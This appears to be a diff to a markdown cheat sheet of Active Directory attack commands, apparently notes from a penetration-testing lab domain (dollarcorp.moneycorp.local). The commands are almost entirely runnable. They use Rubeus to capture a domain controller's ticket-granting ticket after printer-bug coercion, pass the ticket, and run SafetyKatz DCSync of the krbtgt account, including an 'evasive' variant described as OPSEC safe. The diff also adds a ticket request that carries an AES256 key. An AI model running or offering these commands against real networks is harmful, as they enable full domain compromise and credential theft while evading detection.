@@ -4,23 +4,30 @@ Coarse/Force machine accounts to connect to a machine and capture their TGT
 
 Use Rubeus on App server (`dcorp-appsrv`) to capture TGT of DC machine account
 ```powershell
-C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /interval:5 /nowrap
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
 ```
 
 Abuse printer bug to force the DC to connect to the App server
 ```powershell
-C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/MS-RPRN.exe -args \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+Loader.exe -path .\MS-RPRN.exe -args \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
 ```
 
 Copy the base64 encoded TGT, remove extra spaces (if any) and use it on your attacking host
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args ptt /tikcet:<base64>
+.\Loader.exe -path .\Rubeus.exe -args ptt /ticket:<base64>
 ```
 
 Perform DCsync thats OPSEC safe because it's the machine account
 ```powershell
-.\Loader.exe -path .\SafetyKatz.exe -args lsadump::dcsync /user:dcorp\krbtgt
+.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
+
+```powershell
+.\Loader.exe -path .\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+
+---
 ### Abusing Unconstrained Delegation
 Discover computers with unconstrained delegation (PowerView + AD module)
 ```powershell
@@ -44,10 +51,10 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args kerb
 
 Copy the base64 encoded TGT, remove extra spaces (if any) and use it on your attacking host
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args ptt /tikcet:<base64>
+.\Loader.exe -path .\Rubeus.exe -args ptt /ticket:<base64>
 ```
 
 Perform DCsync thats OPSEC safe because it's the machine account
 ```powershell
-.\Loader.exe -path .\SafetyKatz.exe -args lsadump::dcsync /user:dcorp\krbtgt
+.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
